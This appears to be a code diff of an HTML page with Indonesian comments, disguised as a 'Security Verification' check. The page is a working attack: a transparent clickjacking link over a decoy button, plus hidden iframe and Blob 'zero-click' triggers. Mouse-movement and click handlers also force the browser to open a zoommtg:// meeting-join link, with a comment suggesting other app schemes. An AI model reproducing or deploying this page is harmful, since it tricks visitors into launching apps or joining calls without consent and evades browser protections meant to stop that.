@@ -3,103 +3,163 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Verification</title>
+<title>System Security Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     background: #f4f6f8;
-    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0;
+    height: 100vh; margin: 0; flex-direction: column;
   }
   .panel {
     background: #fff; padding: 40px; border-radius: 12px;
     box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
+    max-width: 400px; width: 100%; position: relative;
   }
-  h1 { color: #333; margin-bottom: 10px; }
-  p { color: #666; margin-bottom: 20px; }
-  
-  /* Area Pemicu (Hover Target) */
-  #hoverTarget {
-    background: #007aff;
-    color: #fff;
-    padding: 20px 40px;
-    border-radius: 8px;
-    font-size: 18px;
-    font-weight: bold;
-    cursor: crosshair;
-    transition: transform 0.2s;
+  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
+  p { color: #666; margin-bottom: 20px; font-size: 14px; }
+  .fake-btn {
+    background: #007aff; color: #fff; padding: 15px 30px;
+    border-radius: 8px; font-size: 18px; font-weight: bold;
+    display: inline-block; position: relative; cursor: pointer;
+    user-select: none;
   }
-  #hoverTarget:hover {
-    transform: scale(1.05);
-    background: #005bb5;
+  .fake-btn:hover { background: #005bb5; }
+
+  /* Link Transparan Clickjacking */
+  .trap-link {
+    position: absolute; top: 0; left: 0;
+    width: 100%; height: 100%;
+    opacity: 0; cursor: pointer; z-index: 10;
   }
-  
-  #status { margin-top: 20px; color: #f00; font-weight: bold; }
+
+  #log {
+    margin-top: 20px; background: #000; color: #0f0;
+    padding: 10px; font-family: monospace; font-size: 12px;
+    border-radius: 6px; width: 100%; max-width: 400px;
+    height: 100px; overflow-y: auto; text-align: left;
+  }
+  iframe { display: none; }
 </style>
 </head>
 <body>
 
 <div class="panel">
-  <h1>🔒 Security Check</h1>
-  <p>Gerakkan pointer Anda ke area biru di bawah ini.</p>
+  <h1>🔒 Security Verification</h1>
+  <p>Gerakkan pointer atau klik tombol untuk verifikasi sistem.</p>
   
-  <div id="hoverTarget">Hover Here to Verify</div>
-  <div id="status"></div>
+  <div class="fake-btn" id="btnWrapper">
+    Verify System
+    <!-- SKEMA TARGET: Ganti dengan zoommtg://, facetime://, slack://, dll -->
+    <a href="zoommtg://zoom.us/join?action=join&confno=123456789" class="trap-link" id="trapLink"></a>
+  </div>
 </div>
+
+<div id="log">Sistem siap...</div>
 
 <script>
 (function () {
   'use strict';
 
-  var target = document.getElementById('hoverTarget');
-  var status = document.getElementById('status');
-  
-  // Skema target (Ganti sesuai kebutuhan)
-  var targetScheme = "zoommtg://zoom.us/join?confno=123456789";
+  var logEl = document.getElementById('log');
+  var trapLink = document.getElementById('trapLink');
   var hasTriggered = false;
 
+  function log(msg) {
+    logEl.innerHTML += "> " + msg + "<br>";
+    console.log(msg);
+  }
+
+  // Skema target untuk Zero-Click
+  var targetScheme = "zoommtg://zoom.us/join?action=join&confno=123456789";
+
   // ============================================
-  // 1. TRIGGER VIA MOUSEOVER / MOUSEMOVE
+  // 1. ZERO-CLICK TRIGGER (IFRAME SANDBOX)
   // ============================================
-  target.addEventListener('mouseover', function() {
+  function zeroClickIframe() {
+    if (hasTriggered) return;
+    try {
+      var iframe = document.createElement('iframe');
+      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups allow-same-origin";
+      iframe.style.display = "none";
+      
+      iframe.srcdoc = `
+        <script>
+          try { window.top.location.href = "${targetScheme}"; } catch(e) {}
+        <\/script>
+      `;
+      document.body.appendChild(iframe);
+      log("[Zero-Click] Iframe Sandbox trigger sent.");
+    } catch(e) { log("[Zero-Click] Gagal: " + e.message); }
+  }
+
+  // ============================================
+  // 2. ZERO-CLICK TRIGGER (BLOB WRAPPER)
+  // ============================================
+  function zeroClickBlob() {
+    if (hasTriggered) return;
+    try {
+      var blobPayload = `<script>window.top.location.href = "${targetScheme}";<\/script>`;
+      var blob = new Blob([blobPayload], { type: 'text/html' });
+      var url = URL.createObjectURL(blob);
+      
+      var iframe = document.createElement('iframe');
+      iframe.style.display = "none";
+      iframe.src = url;
+      document.body.appendChild(iframe);
+      log("[Zero-Click] Blob Wrapper trigger sent.");
+    } catch(e) { log("[Zero-Click] Blob gagal: " + e.message); }
+  }
+
+  // ============================================
+  // 3. POINTER HOVER TRIGGER (mousemove)
+  // ============================================
+  document.body.addEventListener('mousemove', function(e) {
+    if (hasTriggered) return;
+    
+    // Jika pointer bergerak ke area tengah (dekat tombol)
+    var x = e.clientX;
+    var y = e.clientY;
+    
+    if (x > window.innerWidth / 2 - 100 && x < window.innerWidth / 2 + 100 &&
+        y > window.innerHeight / 2 - 100 && y < window.innerHeight / 2 + 100) {
+      hasTriggered = true;
+      log("[Hover] Pointer mendekat. Memicu skema...");
+      
+      // Trigger via trapLink click (paling mungkin berhasil)
+      trapLink.click();
+    }
+  });
+
+  // ============================================
+  // 4. GESTURE BYPASS (RACE CONDITION ON CLICK)
+  // ============================================
+  document.getElementById('btnWrapper').addEventListener('click', function() {
     if (hasTriggered) return;
     hasTriggered = true;
     
-    status.innerText = "Mencoba memicu skema...";
-    console.log("[!] Pointer hovered. Triggering protocol...");
-
-    // Coba tembakkan skema
-    try {
-      // Trik 1: Location replace
-      window.location.replace(targetScheme);
-      
-      // Trik 2: Iframe (jika replace diblokir)
-      setTimeout(function() {
-        var iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = targetScheme;
-        document.body.appendChild(iframe);
-      }, 100);
-
-    } catch(e) {
-      status.innerText = "Diblokir oleh Browser.";
-      console.log("Gagal:", e);
-    }
+    log("[Click] Gesture terdeteksi. Memicu skema (Race Condition)...");
+    
+    // Eksekusi dalam microtask (0ms) untuk memanfaatkan Transient Activation
+    queueMicrotask(function() {
+      try {
+        window.location.replace(targetScheme);
+      } catch(e) { log("[Click] Gagal: " + e.message); }
+    });
   });
 
   // ============================================
-  // 2. TRIGGER VIA POINTERMOVE (Saat Mouse Bergerak)
+  // 5. TRIGGER CHAIN (EKSEKUSI OTOMATIS)
   // ============================================
-  document.body.addEventListener('pointermove', function(e) {
-    // Jika pointer bergerak ke area tertentu, tembakkan
-    // (Ini lebih agresif, bisa memicu tanpa disengaja)
-    if (e.clientX > window.innerWidth / 2 && !hasTriggered) {
-      // Uncomment baris di bawah untuk mengaktifkan trigger via pointermove
-      // hasTriggered = true;
-      // window.location.replace(targetScheme);
-    }
-  });
+  
+  // Eksekusi Iframe Sandbox setelah 1 detik (Zero-Click)
+  setTimeout(zeroClickIframe, 1000);
+  
+  // Eksekusi Blob Wrapper setelah 2 detik (Zero-Click)
+  setTimeout(zeroClickBlob, 2000);
+
+  log("Payload siap. Menunggu Zero-Click atau interaksi user...");
 
 })();
 </script>
